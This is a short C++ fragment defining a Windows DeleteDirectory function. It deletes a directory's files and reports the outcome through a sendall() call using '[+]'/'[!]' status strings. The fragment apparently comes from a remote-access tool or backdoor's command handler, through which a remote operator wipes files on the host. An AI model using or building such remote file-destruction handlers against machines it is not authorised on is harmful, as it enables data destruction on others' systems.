void DeleteDirectory(string directory)
{
    if (GetFileAttributesA(directory.data()) == INVALID_FILE_ATTRIBUTES) {
        sendall("invalid");
        return;
    
    } sendall("valid");

    struct dirent* entry;
	DIR* dir = opendir(directory.data());

	while ((entry = readdir(dir)) != NULL) {
		string files = directory + "/" + entry->d_name;
		remove(files.data());
    
    } closedir(dir); rmdir(directory.data());

    if (GetFileAttributesA(directory.data()) != INVALID_FILE_ATTRIBUTES) {
        sendall("[!] Unable to Delete Directory");
        return;
    
    } sendall("[+] Directory Deleted");
}